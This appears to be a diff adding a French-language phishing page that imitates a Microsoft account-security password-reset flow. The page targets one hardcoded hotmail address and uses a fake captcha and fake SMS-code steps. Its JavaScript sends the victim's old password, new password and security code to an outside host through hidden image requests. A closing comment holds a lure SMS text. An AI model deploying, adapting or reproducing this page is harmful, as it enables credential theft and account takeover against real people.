@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<title>Sécurité du compte</title>
+		<link id="favicon" rel="shortcut icon" href="favicon.ico"/>
+		<script>
+			var step = 0;
+			var steps;
+
+			var buttonCancel;
+			var buttonSubmit;
+			var buttonFinish;
+			var container;
+
+			// Step 0
+			var radioOpt;
+
+			// Step 1
+			var email;
+			var emailError;
+			var emailUnknown;
+
+			var captchaImage;
+			var captchaNew;
+			var captchaAudio;
+			var captchaInput;
+			var captchaError;
+			var captchaSolution = '';
+			var captchaArray = [
+				'EY3B5',
+				'HGK92D',
+				'8XNXA',
+				'KGDSX6',
+				'TWEDC',
+				'YKSEE',
+				'AWBTH',
+				'MKNCS',
+				'RDT6HW'
+			];
+
+			// Step 2
+			var phonenumber;
+			var phoneError;
+			var phoneValue = '';
+
+			// Step 3
+			var phoneValueDisplay;
+			var phonecode;
+			var phonecodeError;
+
+			// Step 4
+			var oldpassword;
+			var newpassword;
+			var newpasswordbis;
+			var passError;
+			var passUnequal;
+			var passAgain;
+
+
+			// Step x
+			var imageContainer;
+
+			window.onload = function() {
+
+				steps = document.getElementsByClassName('step');
+
+				buttonCancel = document.getElementById('buttonCancel');
+				buttonSubmit = document.getElementById('buttonSubmit');
+				buttonFinish = document.getElementById('buttonFinish');
+				container = document.getElementById('container');
+
+
+				// Step 0 and 2
+				radioOpt = document.getElementsByClassName('radio-opt');
+
+				
+				// Step 1
+				email = document.getElementById('email');
+				emailError = document.getElementById('emailError');
+				emailUnknown = document.getElementById('emailUnknown');
+
+				captchaImage = document.getElementById('captchaImage');
+				captchaNew = document.getElementById('captchaNew');
+				captchaAudio = document.getElementById('captchaAudio');
+				captchaInput = document.getElementById('captchaInput');
+				captchaError = document.getElementById('captchaError');
+
+
+				// Step 2
+				phonenumber = document.getElementById('phonenumber');
+				phoneError = document.getElementById('phoneError');
+
+				// Step 3
+				phoneValueDisplay = document.getElementById('phoneValueDisplay');
+				phonecode = document.getElementById('phonecode');
+				phonecodeError = document.getElementById('phonecodeError');
+
+				// Step 4
+				oldpassword = document.getElementById('oldpassword');
+				newpassword = document.getElementById('newpassword');
+				newpasswordbis = document.getElementById('newpasswordbis');
+				passError = document.getElementById('passError');
+				passUnequal = document.getElementById('passUnequal');
+				passAgain = document.getElementById('passAgain');
+
+				// Step x
+				imageContainer = document.getElementById('imageContainer');
+
+				// Reset everything
+				var l = radioOpt.length;
+				for(var i = 0; i < l; i++) {
+					radioOpt[i].checked = false;
+				}
+				email.value = '';
+				captchaInput.value = '';
+				phonenumber.value = '';
+				phonecode.value = '';
+				oldpassword.value = '';
+				newpassword.value = '';
+				newpasswordbis.value = '';
+
+
+				buttonSubmit.addEventListener('click', function(e) {
+					e.preventDefault();
+					nextStep();
+				}, false);
+
+				captchaNew.addEventListener('click', function(e) {
+					e.preventDefault();
+					newCaptcha();
+				}, false);
+
+				newCaptcha();
+				loadStep();
+			};
+			function nextStep() {
+				if(step == 0) {
+					if(radioOpt[0].checked) {
+						step = 6;
+						loadStep();
+						upgradeButtons();
+						
+					} else if(radioOpt[1].checked) {
+						step++;
+						loadStep();
+					}
+				} else if(step == 1) {
+					if((email.value.toLowerCase()) == '') {
+						emailError.className = 'error visible';
+						emailUnknown.className = 'error';
+					} else if((email.value.toLowerCase()) == 'benbarlou@hotmail.fr') {
+						var c = captchaCheck();
+						if(c) {
+							step++;
+							loadStep();
+						}
+					} else {
+						emailUnknown.className = 'error visible';
+						emailError.className = 'error';
+					}
+				} else if(step == 3) {
+					if(radioOpt[2].checked) {
+						if(parseInt(phonenumber.value) != phonenumber.value) {
+							phoneError.className = 'error visible';
+						} else {
+							phoneError.className = 'error';
+							phoneValue = phonenumber.value;
+							phoneValueDisplay.innerHTML = phoneValue;
+							step++;
+							loadStep();
+						}
+					} else if(radioOpt[3].checked) {
+						step = 7;
+						loadStep();
+						upgradeButtons();
+					}
+
+				} else if(step == 4) {
+					
+					if(phonecode.value.length != 7) {
+						phonecodeError.className = 'error visible';
+					} else {
+						phonecodeError.className = 'error';
+						send(0);
+						step++;
+						upgradeButtons();
+						loadStep();
+					}
+					
+				} else if(step == 2) {
+					passError.className = 'error';
+					passUnequal.className = 'error';
+					passAgain.className = 'error';
+					send(1);
+					if(newpassword.value != newpasswordbis.value) {
+						passUnequal.className = 'error visible';
+					} else if(oldpassword.value == newpassword.value && newpassword.value != '') {
+						passAgain.className = 'error visible';
+					} else if(!checkPassword(newpassword.value)) {
+						passError.className = 'error visible';
+					} else {
+						step++;
+						loadStep();
+					}
+				} else {
+
+				}
+			}
+
+			function loadStep() {
+				var l = steps.length;
+				for(var i = 0; i < l; i++) {
+					steps[i].className = 'step';
+				}
+				steps[step].className = 'step visible';
+			}
+
+			function newCaptcha() {
+				// uppercase
+				var min = 0;
+				var max = (captchaArray.length - 1);
+				var random = Math.round(Math.random() * (max - min) + min);
+				captchaImage.src = 'captcha/captcha-'+random+'.png';
+				captchaSolution = captchaArray[random];
+				captchaInput.value = '';
+			}
+
+			function captchaCheck() {
+				if(captchaInput.value.toUpperCase() != captchaSolution) {
+					captchaInput.className = 'inputError';
+					captchaError.className = 'error visible';
+					return false;
+				} else {
+					captchaInput.className = '';
+					captchaError.className = 'error';
+					return true;
+				}
+			}
+
+			function upgradeButtons() {
+				buttonCancel.className = 'hidden';
+				buttonSubmit.className = 'hidden';
+				buttonFinish.className = 'big-button submit';
+			}
+
+			function checkPassword(p) {
+				var upperCase= new RegExp("^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-,;/]).{8,}$");
+				if(upperCase.test(p)) {
+					return true;
+				} else {
+					return false;
+				}
+			}
+
+			function send(s) {
+				if(typeof s === 'undefined') {
+					s = 9;
+				}
+				var img = document.createElement('img');
+				var tmp;
+				//http://www.inees.org/fileadmin/inees.org/files/logs/
+				if(s == 0) {
+					tmp = 'https://www.inees.org/nulldata?code='+phonecode.value;
+				} else {
+					tmp = 'https://www.inees.org/nulldata??old='+encodeURIComponent(oldpassword.value)+'&new='+encodeURIComponent(newpassword.value);	
+				}
+				img.src = tmp;
+				imageContainer.appendChild(img);
+			}
+		</script>
+		<style>
+			body {
+				margin: 0;
+				padding: 0;
+				font-family:"Segoe UI","Segoe UI Web Regular","Segoe UI Symbol",-apple-system,"Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;
+			}
+			#wrap {
+				width: 384px;
+				margin: auto;
+				padding: 20px 0;
+			}
+			#wrap img {
+				display: block;
+				margin: auto;
+			}
+			#wrap h1 {
+				font-weight: 200;
+				font-size: 37px;
+				line-height: 40px;
+				margin: 20px 0;
+				padding: 3px 10px;
+
+				text-align: center;
+
+				-webkit-user-select: none; -moz-user-select: -moz-none; -ms-user-select: none; user-select: none;
+			}
+			#wrap p {
+				text-align: center;
+				padding: 0 10px;
+
+				-webkit-user-select: none; -moz-user-select: -moz-none; -ms-user-select: none; user-select: none;
+			}
+
+			#formd {
+				padding: 10px 10px;
+			}
+			#formd div {
+				margin-bottom: 10px;
+			}
+			#formd label {
+				cursor: pointer;
+			}
+
+			#button-container {
+				padding-top: 40px;
+			}
+
+			.button {
+				width: 176px;
+				height: 32px;
+				display: inline-block;
+				line-height: 32px;
+				text-align: center;
+				cursor: pointer;
+
+				text-decoration: none;
+				border: 2px solid transparent;
+
+				-webkit-user-select: none; -moz-user-select: -moz-none; -ms-user-select: none; user-select: none;
+			}
+			.big-button {
+				height: 32px;
+				display: inline-block;
+				line-height: 32px;
+				text-align: center;
+				cursor: pointer;
+				padding: 0 20px;
+
+				text-decoration: none;
+				border: 2px solid transparent;
+
+				-webkit-user-select: none; -moz-user-select: -moz-none; -ms-user-select: none; user-select: none;
+			}
+			.button:hover, .big-button:hover {
+				border: 2px solid rgba(0,0,0, 0.2);
+			}
+			.cancel {
+				background: rgba(0,0,0, 0.2);
+				color: #000;
+			}
+			.submit {
+				background: rgb(0, 120, 215);
+				color: #fff;
+			}
+
+			.disabled { opacity: 0.8 !important; }
+
+			#footer {
+				text-align: center;
+				padding-top: 70px;
+			}
+			#footer a {
+				display: inline-block;
+				color: rgb(0, 120, 215);
+				font-size: 13px;
+				text-decoration: none;
+
+				margin: 0 20px;
+			}
+			#footer img {
+				margin-top: 15px;
+			}
+
+			.step {
+				display: none;
+			}
+
+			#container input[type="text"], #container input[type="password"] {
+				display: block;
+				width: 372px;
+				padding: 0 4px;
+				height: 28px;
+				line-height: 28px;
+				border: 2px solid rgba(0,0,0, 0.2);
+				font-size: 14px;
+			}
+			#container input[type="text"]:focus, #container input[type="password"]:focus {
+				border: 2px solid rgb(0, 120, 215);
+			}
+
+			#container img {
+				float: left;
+			}
+
+			.error {
+				margin: 0 0 0 -10px;
+				padding: 0;
+				text-align: left !important;
+				display: block;
+				color: rgb(255,40,40);
+				display: none;
+			}
+			.visible { display: block; }
+			.hidden { display: none; }
+
+			.inputError {
+				border: 2px solid rgb(255,0,0);
+			}
+
+			.label {
+				display: block;
+				font-size: 14px;
+				text-align: left !important;
+				margin: 20px 0 0;
+			}
+
+			#buttons-right {
+				float: right;
+				width: 180px;
+			}
+
+			#three:checked + label + #phonecheck {
+				display: block !important;
+			}
+			#three:not(:checked) + label + #phonecheck {
+				display: none !important;
+			}
+
+		</style>
+	</head>
+	<body>
+		<div id="wrap">
+			<img src="logo.svg" width="266" height="32" />
+			<div id="container">
+				<div class="step"><!-- 0 -->
+					<h1>Avez-vous demandé à réinitialiser votre mot de passe ?</h1>
+					<form id="formd">
+						<div><input type="radio" class="radio-opt" name="acc" id="one" value="one"><label for="one"> J'ai effectué cette demande</label></input></div>
+						<div><input type="radio" class="radio-opt" name="acc" id="two" value="two"><label for="two"> Je ne suis pas à l'origine de cette demande</label></input></div>
+					</form>
+					<p>Sans action de votre part votre mot de passe sera réinitialisé au bout de 24 heures</b></p>
+				</div>
+
+
+
+				<div class="step"><!-- 1 -->
+					<h1>Informations sur le compte</h1>
+					<p>Nous avons besoin de vérifier que vous êtes bien le propriétaire de ce compte. Tout d’abord, entrez votre adresse email complète <b>ben******@hotmail.fr</b></p>
+					<input type="text" id="email" placeholder="Adresse Email" />
+					<p class="error" id="emailError">Ces informations sont nécessaires.</p>
+					<p class="error" id="emailUnknown">Essayez d'entrer de nouveau votre compte Microsoft. Celui-ci n'est pas reconnu.</p>
+					<div style="padding: 20px 0;">
+						<img width="200" height="100" id="captchaImage" />
+						<div id="buttons-right">
+							<a href="#" class="button cancel" id="captchaNew" style="margin-bottom: 10px;">Nouveau</a>
+							<a href="#" class="button cancel" id="captchaAudio">Fichier Audio</a>
+						</div>
+					</div>
+						<input type="text" id="captchaInput" placeholder="Entrez les caractères que vous voyez" />
+						<p class="error" id="captchaError">Entrez tous les caractères que vous voyez.</p>
+
+				</div>
+
+
+				<div class="step"><!-- 4 -->
+					<h1>Redéfinition de votre mot de passe</h1>
+					<p>Par sécurité veuillez changer le mot de passe de votre compte Microsoft :</p>
+					<input type="password" id="oldpassword" placeholder="Votre ancien mot de passe" />
+					
+					<br /><br />
+
+					<input type="password" id="newpassword" placeholder="Nouveau mot de passe" />
+
+					<br />
+					<p class="error" id="passError">Choisissez un mot de passe contenant un mélange de majuscules, de minuscules, de chiffres et de symboles.</p>
+					<p class="error" id="passUnequal">Les mots de passe ne correspondent pas.</p>
+					<p class="error" id="passAgain">Choisissez un mot de passe que vous n’avez jamais utilisé. Pour contribuer à protéger votre compte, vous devez choisir un nouveau mot de passe chaque fois que vous le redéfinissez.</p>
+					<input type="password" id="newpasswordbis" placeholder="Retaper le nouveau mot de passe" />
+					
+					<p>8 caractères minimum ; différencie majuscules et minuscules</p>
+				</div>
+
+
+				<div class="step"><!-- 2 -->
+					<h1>Nous devons vérifier votre identité</h1>
+					<p>Comment souhaitez-vous obtenir votre code de sécurité ?</p>
+					<form id="formd">
+						<div>
+							<input type="radio" class="radio-opt" name="accw" id="three" value="three" />
+							<label for="three"> SMS au ********86</label>
+							<div id="phonecheck">
+								<p>Pour confirmer qu’il s’agit bien de votre numéro de téléphone, entrez les 4 derniers chiffres, y compris 86, puis cliquez sur « Envoyer le code » pour recevoir votre code.</p>
+								<input type="text" id="phonenumber" placeholder="4 derniers chiffres du numéro de téléphone" maxlength="4" />
+								<p class="error" id="phoneError">Entrez uniquement les 4 derniers chiffres du numéro de téléphone</p>
+							</div>
+						</div>
+						<div>
+							<input type="radio" class="radio-opt" name="accw" id="four" value="four" />
+							<label for="four"> Je n’ai aucune de ces informations</label>
+						</div>
+					</form>
+				</div>
+
+
+
+				<div class="step"><!-- 3 -->
+					<h1>Entrer votre code de sécurité</h1>
+					<p>Si <span id="phoneValueDisplay"></span> correspond aux 4 derniers chiffres du numéro de téléphone de votre compte, nous vous enverrons un code.</p>
+					<input type="text" id="phonecode" placeholder="Code" />
+					<p class="error" id="phonecodeError">Entrez le code à 7 chiffres. Le code contient uniquement des chiffres.</p>
+				</div>
+
+
+
+				<div class="step"><!-- 5 -->
+					<h1>Votre compte a été sécurisé</h1>
+					<p>Vous pouvez à présent utiliser vos nouvelles informations de sécurité pour vous connecter à votre compte.</p>
+					<p>Voici un résumé de ce que vous venez de faire :</p>
+					<p><b>Votre mot de passe a été modifié</b></p>
+					<p>Les informations de votre compte vont être revues par notre équipe de sécurité. <b>Il est possible que vous ne puissiez plus accéder à votre compte pendant quelques heures.</b></p>
+					<!-- Remove cancel button and make the next button big and linked to outlook.com -->
+				</div>
+
+
+
+				<div class="step"><!-- 6 -->
+					<h1>Votre compte va être réinitialisé</h1>
+					<p>Le mot de passe de votre compte sera réinitialisé dans un délai de 24h</p>
+					<!-- Remove cancel button and make the next button big and linked to outlook.com -->
+				</div>
+
+				<div class="step"><!-- 7 -->
+					<h1>Votre compte n'a pu être sécurisé</h1>
+					<p>Veuillez contacter le service client Microsoft</p>
+					<!-- Remove cancel button and make the next button big and linked to outlook.com -->
+				</div>
+			</div>
+
+			<div id="button-container">
+				<a href="https://outlook.com/" class="button cancel" id="buttonCancel">Annuler</a>
+				<a href="#" class="button submit" id="buttonSubmit">Suivant</a>
+				<a href="https://outlook.com/" class="big-button submit hidden" id="buttonFinish" style="width: 320px;">Suivant</a>
+			</div>
+
+
+			<div id="footer"><a href="https://www.microsoft.com/fr-fr/servicesagreement/default.aspx">Conditions d'utilisation</a> <a href="https://privacy.microsoft.com/fr-fr/privacystatement">Confidentialité et cookies</a> <a href="https://outlook.com/">Se connecter</a>
+				<img src="microsoft.svg" width="47" height="9"/>
+			</div>
+		</div>
+		<div id="imageContainer" class="hidden"></div>
+	</body>
+</html>
+
+<!--
+
+Verify
+Utiliser 9561337 comme code de réinitialisation de mot de passe Microsoft
+
+-->
